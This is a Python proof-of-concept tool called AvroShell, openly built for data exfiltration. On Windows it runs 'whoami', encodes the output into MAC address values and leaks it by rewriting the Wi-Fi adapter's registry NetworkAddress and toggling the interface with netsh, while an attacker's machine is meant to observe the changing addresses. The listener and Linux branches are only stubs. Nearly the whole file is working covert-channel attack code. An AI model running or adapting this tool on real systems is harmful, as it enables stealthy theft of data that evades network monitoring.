import argparse
import subprocess


# Note, you will need admin/or root privileges to run this script


#                    structure of mac payload encoding
# +-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+
# |  B  |  E  |  E  |  F  |  F  |  F  |  0  |  0  |  A  |  B  |  B  |  C  |
# +-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+
#    0     1     2     3     4     5     6     7     8     9    10    11 
#
# Using 3 octets for complexity since collisions decrease with complexity
# Uses 1 octets for buffer handling (Max 255 messages per conversation) - 255 bytes per buffer
# Uses 2 octets for message content

identifier       = "BEEFFF"    # Set default MAC OUI as something that isn't registered - collisions should not occur
operating_system = 0           # OS not set by default
WNIC_Name        = "Wi-Fi 2"   # The WNIC name and reg key path are hardcoded. If regex is used, every MAC address for every interface would need to be overwritted.
REG_KEY_PATH     = "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0004"
output           = ""

# This is the command to run for windows
def command(cmd):
    global output
    result = subprocess.run(
    f'{cmd}', 
    shell=True, 
    check=True, 
    capture_output=True, 
    text=True
    )

    output = result.stdout
    print("[INFO] Executed Comnmand\n")
    print(output)
    return output

# This function returns the windows MAC address to the hardware address
def return_mac_to_normal():
    global WNIC_Name
    global REG_KEY_PATH
    
    subprocess.run(
    f'reg add "{REG_KEY_PATH}" /v NetworkAddress /t REG_SZ /d "" /f && '
    f'netsh interface set interface name="{WNIC_Name}" admin=disable && '
    f'netsh interface set interface name="{WNIC_Name}" admin=enable',
    shell=True, check=True
    )
    print("[INFO] Returning MAC to Hardware address")

def exfiltrator(msg):
    global operating_system

    if operating_system == "1":
        print("Linux goes here")

    if operating_system == "2":
        # This POC assumes the registry path and values are known for the WNIC.
        # For presentation purposes, the path is hardcoded for convience, For a fully
        # automated POC consider something like this: https://thepythoncode.com/article/make-a-mac-address-changer-in-python

        subprocess.run(
        f'reg add "{REG_KEY_PATH}" /v NetworkAddress /t REG_SZ /d "' + msg +'" /f && '
        f'netsh interface set interface name="{WNIC_Name}" admin=disable && '
        f'netsh interface set interface name="{WNIC_Name}" admin=enable',
        shell=True, check=True
        )

        print("Changed MAC to: " + msg)
    return_mac_to_normal()

# Encodes data into the MAC address format, makes sure that padding is added
def encoder(message, chunk_num):
    global identifier
    chunk_len = 3
    hh = ""
    h = ''.join(hex(ord(c))[2:] for c in message)
    if len(message) < chunk_len:
        hh = identifier + chunk_num + h
        padding = 2 - len(h) + 2

        for o in range(0, padding):
            hh += "0"
    elif len(message) == chunk_len:
        hh = identifier + chunk_num + h

    print(hh)
    return hh

# packages data to be an 2 octets
def packager(message):
    responses  = [(message[i:i+2]) for i in range(0, len(message), 2)]
    return responses

# This function calculates the chunk number, and passes data to the packager and exfiltrator
def neutrino_concentrator(message):
    c = 0 # counter
    responses = packager(message)

    if c == 0:
        hex_value = f"{len(responses):02X}"
        rr = encoder("",str(hex_value))
        exfiltrator(rr)
        c = c + 1

    for r in responses:
        hex_value = f"{c:02X}"
        rr = encoder(str(r),str(hex_value))
        exfiltrator(rr)
        c = c + 1

    print("Sent messages: " + str(responses))
    
        
def main():
    global identifier
    global operating_system
    
    print("AvroShell: Out-of-Band Networkless Exfiltration Tool")
    print("Author:    Elysee Franchuk (kva55)")
    print("github:    https://github.com/kva55/AvroShell/\n")

    epilog="""
    e.g. python3 AvroShell.py -v -id "AABBCC" -O 2 <-- Victim Server
    e.g. python3 AvroShell.py -l -id "AABBCC" -O 1 <-- Attacker Listener (One-way)       
    """

    parser = argparse.ArgumentParser(usage=epilog)
    parser.add_argument("-v",  "--victim", action='store_true', help="Exfiltrate data")
    parser.add_argument("-l",  "--listen", action='store_true', help="Listen for exfiltration")
    parser.add_argument("-O",  "--operating-system", help="Operating System (1=Linux, or 2=Windows)", type=str, required=True)
    parser.add_argument("-id", "--identifier", help="Set 2 octet identifier", type=str)

    args = parser.parse_args()

    if args.identifier:
        # Check if hexadecimal, otherwise you cannot use input as MAC OUI
        hexcheck = True
        try:
            int(args.identifier, 16)
        except:
            hexcheck = False

        if len(args.identifier) == 6 and hexcheck == True:
            print("[INFO] Using identifier %s" % args.identifier)
            identifier = args.identifier
        else:
            print("[INFO] Using identifier Using default \"BE:EF:FF\" due to malformed input")
            
    else:
        print("[INFO] No identifier supplied. Using default \"BE:EF:FF\" octets for MAC OUI")

    if args.operating_system:
        if args.operating_system == "1" or args.operating_system == "2":
            if args.operating_system == "1":
                print("[INFO] Selected Linux")
            if args.operating_system == "2":
                print("[INFO] Selected Windows")
            operating_system = args.operating_system
        else:
            print("[ERROR] Unknown Operating System Selected.")
            exit(1)
        

    if args.listen or args.victim:
        if args.listen:
            print("Stepping into listener function")
        if args.victim:
            print("[DEBUG] Stepping into victim exfiltration")
            message = command("whoami")
            neutrino_concentrator(message)
            return_mac_to_normal() # Returning MAC to default hardware address
    else:
        print("[ERROR] No mode selected.")
        exit(1)



if __name__ == "__main__":
    main()
